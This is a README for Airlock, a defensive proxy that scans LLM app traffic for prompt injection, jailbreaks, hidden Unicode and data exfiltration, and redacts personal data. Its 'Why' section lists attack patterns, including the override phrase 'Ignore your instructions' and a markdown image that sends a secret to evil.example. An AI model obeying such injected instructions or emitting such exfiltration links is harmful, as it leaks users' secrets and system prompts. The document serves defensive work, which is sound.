# Airlock · A firewall for LLM apps

> Built by [Vishwanathan R](https://vishwanathan.dev) · [Portfolio](https://vishwanathan.dev) · [Resume](https://vishwanathan.dev/resume.pdf)

Airlock sits between your app and the language model, like a security checkpoint. Every message going **in** is scanned for prompt injection, jailbreaks and hidden instructions, and secrets and personal data are swapped for placeholders before the model sees them. Every answer coming **out** is checked for a leaked system prompt and for data being smuggled out through image links. It speaks the OpenAI chat API, so adding it to an app is a one-line change.

![The checkpoint](docs/screenshots/checkpoint.png)

## Why

An LLM reads instructions and data in the same stream of text, so anything it reads can try to give it orders: a user, a help-centre article, a web page, a PDF, an email. Real incidents follow the same few patterns:

- **Direct injection:** "Ignore your instructions and…".
- **Indirect injection:** the attack is planted in a document the bot retrieves, and the user never sees it.
- **Hidden text:** invisible Unicode tag characters, zero-width characters, look-alike letters, base64, so a human reviewer sees nothing.
- **Exfiltration:** the model is told to add a markdown image like `![](https://evil.example/?q=<secret>)`. The chat window loads the image and the data is gone.
- **Data leaking in:** customers paste card numbers, Aadhaar numbers, API keys into chats that get logged and sent to a third party.

Airlock handles all five in one place, in front of any model.

## Try it

The live demo runs entirely in your browser. **Nova**, the support bot of a made-up phone company, is deliberately gullible: it obeys any instruction it reads.

1. Turn Airlock **off** and send "Steal the system prompt" or "Poisoned help article". Nova falls for it.
2. Turn Airlock **on** and send the same thing. The checkpoint stops it and the X-ray shows why.

![With Airlock off, Nova leaks its prompt](docs/screenshots/airlock-off.png)

The X-ray shows text the way the scanner sees it, in baggage-scanner false colour: orange for attacks, blue for secrets and personal data, green for hidden or disguised text, red for data leaving. Invisible characters are made visible and tag-character text is spelled out.

![X-ray of a disguised attack](docs/screenshots/xray.png)

Personal data is swapped for placeholders on the way in and put back on the way out, so the model never sees it and the user still gets a normal answer. Secrets (keys, tokens, passwords) are never put back.

![Redaction](docs/screenshots/redaction.png)

## Results

From `npm run evaluate`, on text kept out of training:

| | |
| --- | --- |
| Attacks caught | **100%** (90.9% blocked outright, the rest flagged) |
| Disguised attacks caught | **99.7%** |
| Everyday messages flagged | **0%** |
| Time per message | **0.1 ms** median, 0.3 ms p95 |

Test set: 416 attacks, 416 everyday messages, and every attack again in six disguises (576 more).

What each layer adds (share of attacks caught):

| Attack | Rules only | Classifier only | Airlock |
| --- | --- | --- | --- |
| Override the instructions | 36.6% | 100% | 100% |
| Extract the system prompt | 58.5% | 100% | 100% |
| Planted in a document | 81.1% | 100% | 100% |
| Hand-written, never seen in training | 25% | 100% | 100% |
| Hidden in base64 | 40.6% | 29.2% | **100%** |
| S p a c e d  out | 30.2% | 97.9% | 97.9% |
| l33t | 16.7% | 100% | 100% |

Rules are exact but miss paraphrases. The classifier generalises but can't read base64. Unmasking the text first is what lets both see through disguises.

![Results page](docs/screenshots/results.png)

**Be honest about these numbers.** The data is synthetic: attacks and everyday messages are generated from templates, plus a small hand-written held-out set of attack styles and messages the model never saw. Real traffic is messier, so real-world catch rates will be lower and there will be false alarms. Treat the numbers as a floor to check against your own traffic. Every miss and false alarm is listed on the Results page, not hidden.

## How it works

```mermaid
flowchart LR
  A[Message or document] --> U[Unmask<br/>invisible chars, tag text,<br/>look-alikes, spacing, l33t]
  U --> D[Decode layers<br/>base64, hex, URL, rot13]
  D --> R[Rules<br/>regex with explanations]
  D --> C[Classifier<br/>hashed n-grams + logistic regression]
  A --> P[DLP<br/>cards, Aadhaar, PAN, IBAN, keys]
  R & C & P --> V{Policy}
  V -->|block| X[Polite refusal]
  V -->|redact / flag / allow| M[Model]
  M --> O[Output checks<br/>canary, prompt overlap,<br/>exfil links, secrets]
  O --> Y[Answer, placeholders restored]
```

1. **Unmask.** Strips zero-width and bidirectional control characters, decodes Unicode tag-character smuggling, maps Cyrillic and Greek look-alikes back to Latin inside Latin words, joins `i g n o r e` spacing and reads l33t (with exceptions for real things like `5g`, `2fa`, `10am`).
2. **Decode.** Finds base64, hex, URL-encoded and rot13 runs and decodes them, so instructions hidden inside are scanned too.
3. **Rules.** Hand-written patterns for each attack family, each with a plain-English reason. Some only fire on retrieved documents (an article saying "assistant, do X" is suspicious; a user saying it is not).
4. **Classifier.** Word and character n-grams hashed into 65,536 dimensions, logistic regression trained with AdaGrad and class weights, written from scratch with no ML library. It runs on the unmasked text and every decoded layer, and the highest score counts. The model is a 110 KB JSON file that runs the same in Node and in the browser.
5. **Data loss prevention.** Each pattern has a validator where one exists: Luhn for cards, Verhoeff for Aadhaar, mod-97 for IBAN, the PAN structure, entropy for passwords. A random 16-digit order number is not mistaken for a card.
6. **Policy.** Each kind of finding maps to allow, flag, redact or block. The classifier blocks at 0.85 and flags at 0.6 by default. Disguise combined with an attack is always critical.
7. **Output checks.** A canary reference is planted in the system prompt; if it comes back, or the answer shares long word runs with the system prompt, the answer is stopped. Markdown images and links to domains not on the allowlist are removed. Secrets in the answer are redacted.

## Run it

Requires Node 22.13+.

```bash
npm install
npm run dev          # web on :5173, API on :8080
npm test             # 26 unit and API tests
npm run test:e2e     # browser tests (Playwright)
npm run train && npm run evaluate   # rebuild the model and the report
```

### As a proxy in front of your model

```bash
UPSTREAM_URL=https://api.openai.com/v1 \
UPSTREAM_API_KEY=sk-... \
AIRLOCK_KEYS=key-for-your-app \
ADMIN_TOKEN=change-me \
npm run build && npm start
```

Then point your app at Airlock:

```ts
const client = new OpenAI({ baseURL: "https://airlock.your-company.com/v1", apiKey: process.env.AIRLOCK_KEY });

await client.chat.completions.create({
  model: "gpt-4o-mini",
  messages: [
    { role: "system", content: "You are Acme's support assistant..." },
    { role: "user", content: helpArticle, airlock_source: "context" }, // retrieved text, checked as a document
    { role: "user", content: question },
  ],
});
```

- Works with OpenAI, Gemini's OpenAI-compatible endpoint, Groq, a local Ollama, or anything with the same API. Without `UPSTREAM_URL`, Airlock answers with the demo bot.
- Your provider key stays on the Airlock server. Your app only holds an Airlock key.
- A blocked request gets a polite refusal as a normal reply, so nothing in your app breaks.
- Each response has an `airlock` field and `x-airlock-request` / `x-airlock-response` headers with what was found.

| Endpoint | What it does |
| --- | --- |
| `POST /v1/chat/completions` | The proxy: scan in, forward, scan out |
| `POST /v1/scan` | Scan any text: `{ "text": "...", "source": "user" \| "context" }` |
| `GET /api/events` | Recent verdicts (admin token) |
| `GET/PUT /api/policy` | Read or change the policy (admin token) |
| `GET /api/health` | Health check |

### Docker

```bash
docker build -t airlock .
docker run -p 8080:8080 -e AIRLOCK_KEYS=my-key -e ADMIN_TOKEN=change-me airlock
```

### Live demo on Vercel

Import the repo into Vercel. `vercel.json` builds the static demo (`npm run build:demo`), which runs the whole firewall and the demo bot in the browser. No keys are needed.

## Limits

- Detection is pattern and statistics based. A determined attacker with new phrasing can get past it; Airlock lowers the risk, it doesn't remove it. Keep the model's permissions small.
- English only. Attacks in other languages are mostly caught only by the rules for hidden text and encodings.
- Personal data detection is tuned for India (Aadhaar, PAN, +91 phones) plus cards, IBAN, email and international phones.
- Streaming is turned off: the whole answer is checked before the user sees any of it, so replies arrive in one piece.
- The event log is kept in memory on the server (last 500 verdicts), with personal data already redacted.

## Tech stack

TypeScript · Fastify 5 · zod · React 19 · Vite 6 · Tailwind CSS 4 · Vitest · Playwright · Docker · GitHub Actions

## Licence

MIT
